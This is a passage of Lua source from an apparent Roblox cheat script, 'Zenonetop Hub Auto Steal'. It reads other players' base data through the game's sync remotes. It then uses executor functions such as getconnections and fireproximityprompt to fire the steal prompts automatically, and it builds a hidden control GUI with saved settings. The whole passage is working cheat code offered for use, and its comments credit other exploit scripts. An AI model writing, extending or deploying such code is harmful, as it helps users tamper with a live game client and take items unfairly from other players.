 elseif action == "DictionaryInsert" then
 if current ~= nil then current[b] = a end
 elseif action == "DictionaryRemoved" then
 if current ~= nil then current[b] = nil end
 end
	end
	local function attachPlotChannel(remote, plots, requestData)
 if A.plotSync.connections[remote] then return end
 local channelName = tostring(remote.Name)
 if not plots:FindFirstChild(channelName) then return end
 if requestData and A.plotSync.caches[channelName] == nil then
 local ok, data = pcall(function() return requestData:InvokeServer(channelName) end)
 A.plotSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
 elseif A.plotSync.caches[channelName] == nil then
 A.plotSync.caches[channelName] = {}
 end
 A.plotSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
 for _, packet in ipairs(queue) do applySyncDiff(channelName, packet) end
 end)
	end
	local function ensureSync()
 if A.syncReady then return true end
 local ok = pcall(function()
 local rs = game:GetService("ReplicatedStorage")
 A.packages = rs:WaitForChild("Packages", 10)
 A.datas = rs:WaitForChild("Datas", 10)
 A.plots = workspace:WaitForChild("Plots", 10)
 if not (A.packages and A.datas and A.plots) then return end
 A.animalsData = require(A.datas:WaitForChild("Animals", 10))
 local sync = A.packages:WaitForChild("Synchronizer", 10)
 A.channelFolder = sync:WaitForChild("Channel", 10)
 A.routeRemote = sync:FindFirstChild("CommunicationRoute")
 A.requestData = sync:FindFirstChild("RequestData")
 for _, child in ipairs(A.channelFolder:GetChildren()) do
 if child:IsA("RemoteEvent") then attachPlotChannel(child, A.plots, A.requestData) end
 end
 A.channelFolder.ChildAdded:Connect(function(child)
 if child:IsA("RemoteEvent") then attachPlotChannel(child, A.plots, A.requestData) end
 end)
 A.routeRemote.OnClientEvent:Connect(function(actions)
 for _, action in ipairs(actions) do
 local kind, channelName = action[1], tostring(action[2])
 if A.plots and A.plots:FindFirstChild(channelName) then
 if kind == "ListenerAdded" then
 local remote = A.channelFolder and A.channelFolder:FindFirstChild(channelName)
 if remote and remote:IsA("RemoteEvent") then attachPlotChannel(remote, A.plots, A.requestData) end
 elseif kind == "ListenerRemoved" then
 for remote, conn in pairs(A.plotSync.connections) do
 if tostring(remote.Name) == channelName then
 pcall(function() conn:Disconnect() end)
 A.plotSync.connections[remote] = nil
 A.plotSync.caches[channelName] = nil
 break
 end
 end
 end
 end
 end
 end)
 A.syncReady = true
 end)
 return ok and A.syncReady == true
	end
	local function getPlotOwner(plot)
 local sign = plot and plot:FindFirstChild("PlotSign")
 local frame = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
 local label = frame and frame:FindFirstChild("TextLabel")
 if not label or label.Text == "Empty Base" then return nil end
 return label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
	end
	local function isMyBaseAnimal(animalData)
 if not animalData or not animalData.plot or not A.plots then return false end
 local plot = A.plots:FindFirstChild(animalData.plot)
 if not plot then return false end
 local owner = getPlotOwner(plot)
 return owner == LP.DisplayName or owner == LP.Name
	end
	local function podiumFor(animalData)
 local plot = A.plots and A.plots:FindFirstChild(animalData.plot)
 local podiums = plot and plot:FindFirstChild("AnimalPodiums")
 return podiums and podiums:FindFirstChild(animalData.slot) or nil
	end
	local function animalPos(animalData)
 local podium = podiumFor(animalData)
 return podium and podium:GetPivot().Position or nil
	end
	local function distToAnimal(animalData)
 local root = rootPart()
 local pos = animalPos(animalData)
 return root and pos and (root.Position - pos).Magnitude or math.huge
	end
	local function findPromptForAnimal(animalData)
 if not animalData then return nil end
 local cached = A.promptCache[animalData.uid]
 if cached and cached.Parent then return cached end
 local podium = podiumFor(animalData)
 local base = podium and podium:FindFirstChild("Base")
 local spawn = base and base:FindFirstChild("Spawn")
 if not spawn then return nil end
 local function isStealPrompt(prompt)
 if not prompt or not prompt:IsA("ProximityPrompt") then return false end
 if prompt.Enabled == false then return false end
 local act = tostring(prompt.ActionText or ""):lower()
 if act:find("collect", 1, true) or act:find("collect", 1, true)
 or act:find("collect", 1, true) or act:find("claim", 1, true) then
 return false
 end
 if act:find("steal", 1, true) or act:find("steal", 1, true)
 or act:find("steal", 1, true) or act:find("grab", 1, true)
 or act:find("take", 1, true) or act == "" then
 return true
 end
 return false
 end
 local attach = spawn:FindFirstChild("PromptAttachment")
 local best = nil
 if attach then
 for _, prompt in ipairs(attach:GetChildren()) do
 if isStealPrompt(prompt) then
 best = prompt
 break
 end
 end
 end
 if not best then
 for _, obj in ipairs(spawn:GetDescendants()) do
 if isStealPrompt(obj) then
 best = obj
 break
 end
 end
 end
 if best then
 A.promptCache[animalData.uid] = best
 end
 return best
	end
	local function scanAllPlots()
 if not ensureSync() then return 0 end
 local newCache = {}
 for _, plot in ipairs(A.plots:GetChildren()) do
 local cache = A.plotSync.caches[plot.Name]
 local animalList = cache and cache.AnimalList
 if typeof(animalList) == "table" then
 for slot, animalData in pairs(animalList) do
 if type(animalData) == "table" then
 local animalName = animalData.Index
 local info = A.animalsData and A.animalsData[animalName]
 if info then
 table.insert(newCache, {
 name = info.DisplayName or animalName,
 plot = plot.Name,
 slot = tostring(slot),
 uid = plot.Name .. "_" .. tostring(slot),
 })
 end
 end
 end
 end
 end
 A.animals = newCache
 return #newCache
	end
	local function pickClosest()
 local root = rootPart()
 if not root then return nil end
 local best, bestDist = nil, math.huge
 for _, animalData in ipairs(A.animals) do
 if not isMyBaseAnimal(animalData) then
 local pos = animalPos(animalData)
 local dist = pos and (root.Position - pos).Magnitude or math.huge
 if dist <= (A.primeRange or 80) and dist < bestDist then
 best, bestDist = animalData, dist
 end
 end
 end
 return best
	end
	local function buildCallbacks(prompt)
 if not prompt then
 return
 end
 local existing = A.internalCache[prompt]
 if existing and (#(existing.holdCallbacks or {}) > 0 or #(existing.triggerCallbacks or {}) > 0) then
 return
 end
 local data = {holdCallbacks = {}, triggerCallbacks = {}, ready = true}
 if getconnections then
 local okHold, holds = pcall(getconnections, prompt.PromptButtonHoldBegan)
 if okHold and type(holds) == "table" then
 local idx, conn
 for idx, conn in ipairs(holds) do
 if conn.Function then
 data.holdCallbacks[#data.holdCallbacks + 1] = conn.Function
 end
 end
 end
 local okTrigger, triggers = pcall(getconnections, prompt.Triggered)
 if okTrigger and type(triggers) == "table" then
 local idx, conn
 for idx, conn in ipairs(triggers) do
 if conn.Function then
 data.triggerCallbacks[#data.triggerCallbacks + 1] = conn.Function
 end
 end
 end
 end
 A.internalCache[prompt] = data
	end
	local function executeSemi(prompt, animalData)
 -- Auto Steal V2 Version 2 = FULL BloodHounds (message.txt) logic
 if not prompt or not prompt.Parent or not animalData then
 return false
 end
 buildCallbacks(prompt)
 local data = A.internalCache[prompt]
 if not data then
 data = {holdCallbacks = {}, triggerCallbacks = {}, ready = true}
 A.internalCache[prompt] = data
 end
 if not data.ready then
 return false
 end
 -- refresh callbacks like BloodHounds buildStealCallbacks
 if getconnections then
 local hold, trig = {}, {}
 local ok1, conns1 = pcall(getconnections, prompt.PromptButtonHoldBegan)
 if ok1 and type(conns1) == "table" then
 for _, conn in ipairs(conns1) do
 if type(conn.Function) == "function" then
 hold[#hold + 1] = conn.Function
 end
 end
 end
 local ok2, conns2 = pcall(getconnections, prompt.Triggered)
 if ok2 and type(conns2) == "table" then
 for _, conn in ipairs(conns2) do
 if type(conn.Function) == "function" then
 trig[#trig + 1] = conn.Function
 end
 end
 end
 if #hold > 0 or #trig > 0 then
 data.holdCallbacks = hold
 data.triggerCallbacks = trig
 end
 end

 local function barSet(p, label)
 p = math.clamp(tonumber(p) or 0, 0, 1)
 _G.AceStealBarProgress = p
 pcall(function()
 if _G.StealBar and _G.StealBar.SetProgress then
 _G.StealBar.SetProgress(p)
 end
 end)
 pcall(function()
 if _G.StealBar and _G.StealBar.SetState and label then
 _G.StealBar.SetState(label)
 end
 end)
 end
 local function barReset()
 _G.AceStealBarProgress = 0
 pcall(function()
 if _G.StealBar and _G.StealBar.SetProgress then
 _G.StealBar.SetProgress(0)
 end
 end)
 pcall(function()
 if _G.StealBar and _G.StealBar.SetState then
 _G.StealBar.SetState("IDLE")
 end
 end)
 end

 local HOLD_MIN = tonumber(A.holdMin) or 1.3
 local HOLD_MAX = tonumber(A.holdMax) or 2.6
 local ENTRY_DELAY = tonumber(A.entryDelay) or 0.3
 local STEAL_RANGE = math.clamp(tonumber(A.radius) or tonumber(autoStealRadius) or 9, 1, 100)
 local COOLDOWN = tonumber(A.cooldown) or 0.05
 local ver = (autoStealV2Version == "V2") and "V2" or "V1"

 data.ready = false
 A.state.active = true
 A.state.startTime = tick()
 A.state.phase = "holding"
 A.state.label = animalData.name or "Animal"

 task.spawn(function()
 local label = A.state.label
 local startTime = A.state.startTime
 local fired = false

 -- ========== V2 = FULL BloodHounds executeStealAsync ==========
 if ver == "V2" then
 -- Phase 1: fire all holdCallbacks, wait HOLD_MIN (bar 0→1 over HOLD_MAX window)
 for _, fn in ipairs(data.holdCallbacks or {}) do
 task.spawn(function() pcall(fn) end)
 end
 local tHold = tick()
 while A.enabled and (selectedStealMode == "Semi" or selectedStealMode == "V2") do
 local elapsed = tick() - startTime
 barSet(math.clamp(elapsed / HOLD_MAX, 0, 1), "STEALING")
 if elapsed >= HOLD_MIN then break end
 if not prompt.Parent then
 A.state.active = false
 A.state.phase = "idle"
 data.ready = true
 barReset()
 return
 end
 -- abort nếu quá xa prime range
 if distToAnimal(animalData) > (A.primeRange or 80) then
 A.state.active = false
 A.state.phase = "idle"
 data.ready = true
 barReset()
 return
 end
 task.wait()
 end

 -- Phase 2: waitingRange — vào radius rồi trigger (BloodHounds exact)
 A.state.phase = "waitingRange"
 local alreadyInRange = distToAnimal(animalData) <= STEAL_RANGE
 while A.enabled and (selectedStealMode == "Semi" or selectedStealMode == "V2") and prompt.Parent do
 local elapsed = tick() - startTime
 if elapsed > HOLD_MAX then break end
 if distToAnimal(animalData) > (A.primeRange or 80) then break end
 barSet(math.clamp(elapsed / HOLD_MAX, 0, 1), "STEALING")
 if distToAnimal(animalData) <= STEAL_RANGE then
 if not alreadyInRange then
 task.wait(ENTRY_DELAY)
 end
 if A.enabled and (selectedStealMode == "Semi" or selectedStealMode == "V2") then
 for _, fn in ipairs(data.triggerCallbacks or {}) do
 task.spawn(function() pcall(fn) end)
 end
 -- BloodHounds chỉ dùng triggerCallbacks; giữ fireproximityprompt phụ
 if fireproximityprompt then
 pcall(function() fireproximityprompt(prompt) end)
 end
 pcall(function()
 if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then
 _G.AutoCarrySpeed.WatchPickup(1.25)
 end
 end)
 fired = true
 end
 if fired then
 barSet(1, "SUCCESS")
 -- 100% → 0 ngay, tiếp tục trong radius
 barReset()
 A.state.active = false
 A.state.phase = "idle"
 A.cooldown = 0
 end
 break
 end
 task.wait()
 end
 else
 -- ========== V1 (giữ logic cũ Water-style 50% READY) ==========
 for _, fn in ipairs(data.holdCallbacks or {}) do
 task.spawn(function() pcall(fn) end)
 end
 A.state.phase = "holding"
 while A.enabled and (selectedStealMode == "Semi" or selectedStealMode == "V2") do
 local elapsed = tick() - startTime
 barSet(math.clamp(elapsed / HOLD_MIN, 0, 1) * 0.5, "STEALING")
 if elapsed >= HOLD_MIN then break end
 if not prompt.Parent then break end
 task.wait()
 end
 A.state.phase = "waitingRange"
 barSet(0.5, "READY")
 local alreadyInRange = distToAnimal(animalData) <= STEAL_RANGE
 while A.enabled and (selectedStealMode == "Semi" or selectedStealMode == "V2") do
 local elapsed = tick() - startTime
 if elapsed > HOLD_MAX then break end
 if not prompt or not prompt.Parent then break end
 if distToAnimal(animalData) <= STEAL_RANGE then
 if not alreadyInRange then
 task.wait(ENTRY_DELAY)
 end
 if A.enabled and (selectedStealMode == "Semi" or selectedStealMode == "V2") then
 for _, fn in ipairs(data.triggerCallbacks or {}) do
 task.spawn(function() pcall(fn) end)
 end
 if fireproximityprompt then
 pcall(function() fireproximityprompt(prompt, 1) end)
 pcall(function() fireproximityprompt(prompt) end)
 end
 pcall(function()
 if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then
 _G.AutoCarrySpeed.WatchPickup(1.25)
 end
 end)
 fired = true
 end
 if fired then
 barSet(1, "SUCCESS")
 -- 100% → tiếp tục ngay (reset ở cuối executeSemi)
 end
 break
 end
 task.wait()
 end
 end

 A.state.lastResult = fired and ("Stole " .. tostring(label)) or ("Missed window: " .. tostring(label))
 A.state.active = false
 A.state.phase = "idle"
 A.state.lastResultTime = tick()
 -- 100% → 0 ngay, không chờ cooldown dài — tiếp tục trong radius
 if fired then
 barSet(1, "SUCCESS")
 end
 barReset()
 data.ready = true
 end)
 return true
	end

	local function ensureScanThread()
 if A.scanThread then return end
 A.scanThread = task.spawn(function()
 while _G.AceSemiSteal do
 if A.enabled or (selectedStealMode == "Semi" or selectedStealMode == "V2") then pcall(scanAllPlots) end
 task.wait(5)
 end
 end)
	end
	_G.AceSemiAutoStealSetRadius = function(v)
 local n = tonumber(v)
 if n then A.radius = math.clamp(n, 1, 100) end
	end
	_G.AceSemiAutoStealStop = function()
 A.enabled = false
 if A.conn then A.conn:Disconnect(); A.conn = nil end
 A.state.active = false
 A.state.phase = "idle"
 barReset()
	end
	_G.AceSemiAutoStealStart = function()
 A.radius = math.clamp(tonumber(autoStealRadius) or A.radius or 10, 1, 100)
 -- Water full profiles (Version1 / Version2)
 local ver = (autoStealV2Version == "V2") and "V2" or "V1"
 if ver == "V1" then
 A.holdMin = 1.3
 A.holdMax = 2.6
 A.entryDelay = 0.05
 A.cooldown = 0
 A.primeRange = 80
 else
 A.holdMin = 1.3
 A.holdMax = 2.6
 A.entryDelay = 0.05
 A.cooldown = 0
 A.primeRange = 80
 end
 A.enabled = true
 ensureSync()
 ensureScanThread()
 pcall(scanAllPlots)
 if A.conn then A.conn:Disconnect(); A.conn = nil end
 A.conn = RunService.Heartbeat:Connect(function()
 if not A.enabled then return end
 if (selectedStealMode ~= "Semi" and selectedStealMode ~= "V2") then _G.AceSemiAutoStealStop(); return end
 if A.state.active then return end
 local target = pickClosest()
 if not target then return end
 local prompt = findPromptForAnimal(target)
 if prompt then executeSemi(prompt, target) end
 end)
	end
	_G.AceSemiAutoStealSync = function()
 if (selectedStealMode == "Semi" or selectedStealMode == "V2") and autoStealEnabled then
 _G.AceSemiAutoStealStart()
 else
 _G.AceSemiAutoStealStop()
 end
	end
end
_G.__AceSetupSemiAutoSteal()
_G.AceAutoStealSync = function()
	-- UI: V1=Normal | V2=Semi Version1 | V3=Semi Version2 (BloodHounds) — KHÔNG dùng AceV3
	if not autoStealEnabled then
 if _G.AceNormalAutoStealStop then _G.AceNormalAutoStealStop() end
 if _G.AceSemiAutoStealStop then _G.AceSemiAutoStealStop() end
 if _G.AceV3AutoStealStop then pcall(_G.AceV3AutoStealStop) end
 return
	end
	local mode = selectedStealMode
	if mode == "V1" then mode = "Normal" end
	if mode == "V2" then mode = "Semi"; autoStealV2Version = "V1" end
	if mode == "V3" then
 -- V3 nút = Semi Version 2 full BloodHounds
 mode = "Semi"
 autoStealV2Version = "V2"
 selectedStealMode = "Semi"
	end
	if mode == "Normal" then
 if _G.AceSemiAutoStealStop then _G.AceSemiAutoStealStop() end
 if _G.AceV3AutoStealStop then pcall(_G.AceV3AutoStealStop) end
 if _G.AceNormalAutoStealStart then _G.AceNormalAutoStealStart() end
	elseif mode == "Semi" then
 if _G.AceNormalAutoStealStop then _G.AceNormalAutoStealStop() end
 if _G.AceV3AutoStealStop then pcall(_G.AceV3AutoStealStop) end
 if _G.AceSemiAutoStealStart then _G.AceSemiAutoStealStart() end
	end
end

-- AUTO STEAL V3 (VYNX): proximity hold progress + decay
do
	local V3 = {enabled=false,conn=nil,progress=0,currentUid=nil,holding=false,holdPrompt=nil,cooldownUntil=0,lastHoldPulse=0}
	_G.AceV3Steal = V3
	local function v3Bar(p)
 p = math.clamp(tonumber(p) or 0, 0, 1)
 _G.AceStealBarProgress = p
 pcall(function() if _G.StealBar and _G.StealBar.SetProgress then _G.StealBar.SetProgress(p) end end)
	end
	local function v3Release(prompt)
 if not prompt then return end
 pcall(function() if prompt.InputHoldEnd then prompt:InputHoldEnd() end end)
	end
	local function v3Hold(prompt)
 if not prompt or not prompt.Parent then return end
 pcall(function() if prompt.InputHoldBegin then prompt:InputHoldBegin() end end)
 pcall(function() if fireproximityprompt then fireproximityprompt(prompt, 0) end end)
	end
	local function v3Trigger(prompt)
 if not prompt then return end
 pcall(function() if fireproximityprompt then fireproximityprompt(prompt, 1) end end)
 pcall(function() if prompt.InputHoldEnd then prompt:InputHoldEnd() end end)
	end
	local function v3LiveDist(ad, hrp)
 if not ad or not hrp then return math.huge end
 local plots = workspace:FindFirstChild("Plots")
 local plot = plots and plots:FindFirstChild(ad.plot)
 local pods = plot and plot:FindFirstChild("AnimalPodiums")
 local pod = pods and pods:FindFirstChild(ad.slot)
 if pod then
 local ok, pos = pcall(function() return pod:GetPivot().Position end)
 if ok and pos then ad.worldPosition = pos; return (hrp.Position - pos).Magnitude end
 end
 if ad.worldPosition then return (hrp.Position - ad.worldPosition).Magnitude end
 return math.huge
	end
	function _G.AceV3AutoStealStop()
 V3.enabled = false
 if V3.holdPrompt then v3Release(V3.holdPrompt) end
 if V3.conn then pcall(function() V3.conn:Disconnect() end); V3.conn = nil end
 V3.progress=0; V3.currentUid=nil; V3.holding=false; V3.holdPrompt=nil; V3.cooldownUntil=0
 v3Bar(0)
	end
	function _G.AceV3AutoStealSync()
 if V3.conn then
 V3.enabled = true
 return
 end
 V3.enabled=true; V3.progress=0; V3.currentUid=nil; V3.holding=false; V3.holdPrompt=nil; V3.cooldownUntil=0; V3.lastHoldPulse=0
 -- VYNX: V3 dùng chung animal cache của Normal — ON scanner
 pcall(function()
 if _G.AceNormalSteal then
 _G.AceNormalSteal.enabled = true
 end
 if _G.AceNormalAutoStealStart then
 -- chỉ cần animals scan, không chạy doSteal Normal
 end
 end)
 task.spawn(function()
 while V3.enabled do
 pcall(function()
 local a = _G.AceNormalSteal
 if not a then return end
 a.animals = a.animals or {}
 local plots = workspace:FindFirstChild("Plots")
 if not plots then return end
 local list = {}
 for _, plot in ipairs(plots:GetChildren()) do
 if plot:IsA("Model") then
 local sign = plot:FindFirstChild("PlotSign")
 local yb = sign and sign:FindFirstChild("YourBase")
 local mine = yb and yb:IsA("BillboardGui") and yb.Enabled
 if not mine then
 local podiums = plot:FindFirstChild("AnimalPodiums")
 if podiums then
 for _, podium in ipairs(podiums:GetChildren()) do
 if podium:IsA("Model") then
 local base = podium:FindFirstChild("Base")
 local spawn = base and base:FindFirstChild("Spawn")
 if spawn then
 table.insert(list, {
 plot = plot.Name,
 slot = podium.Name,
 worldPosition = spawn.Position,
 uid = plot.Name .. "_" .. podium.Name,
 })
 end
 end
 end
 end
 end
 end
 end
 a.animals = list
 end)
 task.wait(2.5)
 end
 end)
 V3.conn = RunService.Heartbeat:Connect(function(dt)
 local mode = selectedStealMode
 if mode == "V1" then mode = "Normal" end
 if mode == "V2" then mode = "Semi" end
 if not autoStealEnabled or mode ~= "V3" or not V3.enabled then
 if V3.holdPrompt then v3Release(V3.holdPrompt) end
 if V3.progress > 0 or V3.holding then
 V3.progress=0; V3.currentUid=nil; V3.holding=false; V3.holdPrompt=nil; v3Bar(0)
 end
 return
 end
 if tick() < (V3.cooldownUntil or 0) then v3Bar(0); return end
 local char = LP.Character
 local hrp = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"))
 if not hrp then return end
 local a = _G.AceNormalSteal
 if a and (not a.animals or #a.animals == 0) and _G.AceNormalAutoStealStart then
 -- ensure scanner has run
 end
 local target, bestDist = nil, math.huge
 if a and a.animals then
 for _, ad in ipairs(a.animals) do
 local d = v3LiveDist(ad, hrp)
 if d < bestDist then bestDist=d; target=ad end
 end
 end
 local radius = tonumber(autoStealRadius) or (_G.AceNormalSteal and _G.AceNormalSteal.radius) or 60
 if target and bestDist <= radius then
 if V3.currentUid ~= target.uid then
 if V3.holdPrompt then v3Release(V3.holdPrompt) end
 V3.currentUid=target.uid; V3.progress=0; V3.holding=false; V3.holdPrompt=nil
 end
 local prompt = a and a.promptCache and a.promptCache[target.uid]
 if (not prompt or not prompt.Parent) then
 -- deep find like VYNX findPromptNormal
 local plots = workspace:FindFirstChild("Plots")
 local plot = plots and plots:FindFirstChild(target.plot)
 local pods = plot and plot:FindFirstChild("AnimalPodiums")
 local pod = pods and pods:FindFirstChild(target.slot)
 local base = pod and pod:FindFirstChild("Base")
 local spawn = base and base:FindFirstChild("Spawn")
 if spawn then
 local att = spawn:FindFirstChild("PromptAttachment")
 if att then
 for _, p in ipairs(att:GetChildren()) do
 if p:IsA("ProximityPrompt") then prompt = p; break end
 end
 end
 if not prompt then
 for _, obj in ipairs(spawn:GetDescendants()) do
 if obj:IsA("ProximityPrompt") then prompt = obj; break end
 end
 end
 if prompt and a then a.promptCache[target.uid] = prompt end
 end
 end
 local holdT = 1.4
 local stopT = 0.35
 if not prompt or not prompt.Parent then
 V3.progress = math.clamp(V3.progress + (dt / holdT), 0, 1); v3Bar(V3.progress); return
 end
 V3.holdPrompt = prompt
 local now = tick()
 if (not V3.holding) or (now - (V3.lastHoldPulse or 0) > 0.1) then
 V3.holding=true; V3.lastHoldPulse=now; v3Hold(prompt)
 end
 V3.progress = math.clamp(V3.progress + (dt / holdT), 0, 1)
 v3Bar(V3.progress)
 if V3.progress >= 1 then
 v3Trigger(prompt)
 -- 100% → 0 ngay, GIỮ target để đầy lại liền (không cần lại gần)
 V3.progress = 0
 V3.holding = false
 V3.cooldownUntil = 0
 v3Bar(0)
 -- giữ currentUid + holdPrompt để frame sau tiếp tục hold
 end
 else
 if V3.holding or V3.holdPrompt then v3Release(V3.holdPrompt); V3.holding=false; V3.holdPrompt=nil end
 if V3.progress > 0 then
 local stopT = 0.35
 V3.progress = math.max(0, V3.progress - (dt / stopT)); v3Bar(V3.progress)
 if V3.progress <= 0 then V3.currentUid=nil; v3Bar(0) end
 end
 end
 end)
	end
end



-- ============================================================
-- AUTO STEAL GUI
-- ============================================================
task.spawn(function()
	local CONFIG_FILE = "ZenonetopHubAutoSteal"
	local BackgroundIDs = {"89504528485163","108697485255882","71211662493854","118953269416540","106345334781345","103042929344358","126137370200580","129236724255771","109053968018578","76085007631338","99416158073201","126860692354524","73226092831324","90280869222992","90746158236678","107977050874654","124475159163140","117085976067902","76582249427748","131388128481309","106050493494582","71852104184395","84453255265251","98541566010518","118963313877514","82757811555212","130451097419605","129030262345273","76292842640935","92910922537368","105960347086002","116720305084998","90341354549871","72399600208480","81834484116440","135088241492683","90453834580322","90631990302263","109619268613730","88369503310562","80708025126373","102253425322931","135181794444219","111941119745474","138739435956313","92966351305582","127008542588565","81233250155347","77446891363466","93417009946836","102729289645203","113953274092851","116355482429334","133090961209841","84995781107338"}

	local BASE_W, BASE_H, BASE_H_EXP = 300, 96, 240
	local saved = {
 panelOpen = true, pos = nil, scale = 1.0, locked = false, expanded = false,
 bgIndex = 1, radius = 60, enabled = false, mode = "V1",
	}
	pcall(function()
 if isfile and isfile(CONFIG_FILE) and readfile then
 local d = HttpService:JSONDecode(readfile(CONFIG_FILE))
 if type(d) == "table" then
 saved.panelOpen = d.panelOpen ~= false
 saved.locked = d.locked == true
 saved.expanded = d.expanded == true
 saved.scale = math.clamp(tonumber(d.scale) or 1, 0.5, 2.5)
 saved.bgIndex = math.clamp(tonumber(d.bgIndex) or 1, 1, #BackgroundIDs)
 saved.radius = tonumber(d.radius) or 60
 saved.enabled = d.enabled == true
 saved.mode = (d.mode == "V2" or d.mode == "V3") and d.mode or "V1"
 if type(d.pos) == "table" then saved.pos = d.pos end
 end
 end
	end)
	autoStealRadius = tonumber(saved.radius) or 60

	local main
	local function saveVAS()
 pcall(function()
 if not writefile or not main then return end
 local p = main.Position
 saved.pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 local uiMode = "V1"
 if selectedStealMode == "Semi" or selectedStealMode == "V2" then
 uiMode = (autoStealV2Version == "V2") and "V3" or "V2"
 elseif selectedStealMode == "V3" then
 uiMode = "V3"
 end
 writefile(CONFIG_FILE, HttpService:JSONEncode({
 panelOpen = main.Visible,
 locked = saved.locked,
 expanded = saved.expanded,
 scale = saved.scale,
 pos = saved.pos,
 bgIndex = saved.bgIndex,
 radius = tonumber(autoStealRadius) or 60,
 enabled = autoStealEnabled == true,
 mode = uiMode,
 }))
 end)
	end

	local parent = (typeof(gethui) == "function" and gethui()) or game:GetService("CoreGui")
	pcall(function()
 local o = parent:FindFirstChild("ZenonetopAutoStealGui"); if o then o:Destroy() end
 local b = PlayerGui:FindFirstChild("ZenonetopAutoStealBarGui"); if b then b:Destroy() end
	end)

	local gui = Instance.new("ScreenGui")
	gui.Name = "ZenonetopAutoStealGui"
	gui.Enabled = false -- disabled: menu-only steal
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 50
	pcall(function() gui.Parent = parent end)
	if not gui.Parent then gui.Parent = PlayerGui end

	local function corner(o, r)
 local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 10); c.Parent = o
	end
	local COL = {
 bg = Color3.fromRGB(10,10,12), header = Color3.fromRGB(16,16,18), row = Color3.fromRGB(22,22,26),
 stroke = Color3.fromRGB(50,50,58), white = Color3.fromRGB(240,240,245), dim = Color3.fromRGB(140,140,150),
 green = Color3.fromRGB(70,220,120), greenBg = Color3.fromRGB(20,55,35), off = Color3.fromRGB(40,40,48),
 bar = Color3.fromRGB(180,180,190), barBg = Color3.fromRGB(28,28,32),
	}

	main = Instance.new("Frame", gui)
	main.Size = UDim2.fromOffset(BASE_W, saved.expanded and BASE_H_EXP or BASE_H)
	main.BackgroundColor3 = COL.bg
	main.BorderSizePixel = 0
	main.Active = true
	main.Visible = saved.panelOpen ~= false
	main.ClipsDescendants = true
	main.ZIndex = 60
	corner(main, 12)
	Instance.new("UIStroke", main).Color = COL.stroke

	local bgImg = Instance.new("ImageLabel", main)
	bgImg.Size = UDim2.fromScale(1,1)
	bgImg.BackgroundTransparency = 1
	bgImg.ImageTransparency = 0.35
	bgImg.ScaleType = Enum.ScaleType.Crop
	bgImg.ZIndex = 60
	bgImg.Image = "rbxassetid://" .. BackgroundIDs[saved.bgIndex]
	corner(bgImg, 12)

	local uiScale = Instance.new("UIScale", main)
	uiScale.Scale = saved.scale
	if type(saved.pos) == "table" then
 main.Position = UDim2.new(tonumber(saved.pos.xs) or 0.5, tonumber(saved.pos.xo) or -140, tonumber(saved.pos.ys) or 0.12, tonumber(saved.pos.yo) or 0)
	else
 main.Position = UDim2.new(0.5, -140, 0.12, 0)
	end

	local header = Instance.new("Frame", main)
	header.Size = UDim2.new(1,0,0,28)
	header.BackgroundColor3 = COL.header
	header.BackgroundTransparency = 0.25
	header.BorderSizePixel = 0
	header.ZIndex = 61
	corner(header, 12)

	local title = Instance.new("TextLabel", header)
	title.Size = UDim2.new(0, 72, 1, 0)
	title.Position = UDim2.fromOffset(8, 0)
	title.BackgroundTransparency = 1
	title.Text = "Auto Steal"
	title.TextColor3 = COL.white
	title.Font = Enum.Font.GothamBold
	title.TextSize = 11
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.ZIndex = 62

	local modeBtns = {}
	for i, name in ipairs({"V1","V2","V3"}) do
 local b = Instance.new("TextButton", header)
 b.Size = UDim2.fromOffset(26, 20)
 b.Position = UDim2.new(0, 78 + (i-1)*28, 0.5, -10)
 b.BackgroundColor3 = COL.row
 b.Text = name
 b.TextColor3 = COL.white
 b.Font = Enum.Font.GothamBold
 b.TextSize = 10
 b.ZIndex = 63
 b.AutoButtonColor = false
 corner(b, 6)
 modeBtns[name] = b
	end

	local lockBtn = Instance.new("TextButton", header)
	lockBtn.Size = UDim2.fromOffset(22, 22)
	lockBtn.Position = UDim2.new(1, -92, 0.5, -11)
	lockBtn.BackgroundColor3 = Color3.fromRGB(28,28,32)
	lockBtn.Text = saved.locked and "🔒" or "🔓"
	lockBtn.TextSize = 11
	lockBtn.ZIndex = 63
	corner(lockBtn, 6)

	local onBtn = Instance.new("TextButton", header)
	onBtn.Size = UDim2.fromOffset(40, 20)
	onBtn.Position = UDim2.new(1, -66, 0.5, -10)
	onBtn.BackgroundColor3 = COL.off
	onBtn.Text = "OFF"
	onBtn.TextColor3 = COL.white
	onBtn.Font = Enum.Font.GothamBold
	onBtn.TextSize = 10
	onBtn.ZIndex = 63
	onBtn.AutoButtonColor = false
	corner(onBtn, 10)

	local expBtn = Instance.new("TextButton", header)
	expBtn.Size = UDim2.fromOffset(22, 22)
	expBtn.Position = UDim2.new(1, -24, 0.5, -11)
	expBtn.BackgroundColor3 = Color3.fromRGB(28,28,32)
	expBtn.Text = saved.expanded and "−" or "+"
	expBtn.TextColor3 = COL.white
	expBtn.Font = Enum.Font.GothamBold
	expBtn.TextSize = 14
	expBtn.ZIndex = 63
	corner(expBtn, 6)

	local body = Instance.new("Frame", main)
	body.Size = UDim2.new(1, -16, 0, 44)
	body.Position = UDim2.fromOffset(8, 30)
	body.BackgroundTransparency = 1
	body.ZIndex = 61

	-- % steal bar — to, rõ, đẹp
	local statusLbl = Instance.new("TextLabel", body)
	statusLbl.Name = "Percent"
	statusLbl.Size = UDim2.new(0.55, 0, 0, 22)
	statusLbl.Position = UDim2.fromOffset(0, 0)
	statusLbl.BackgroundTransparency = 1
	statusLbl.Text = "0%"
	statusLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
	statusLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	statusLbl.TextStrokeTransparency = 0.2
	statusLbl.Font = Enum.Font.GothamBlack
	statusLbl.TextSize = 20
	statusLbl.TextXAlignment = Enum.TextXAlignment.Left
	statusLbl.ZIndex = 64

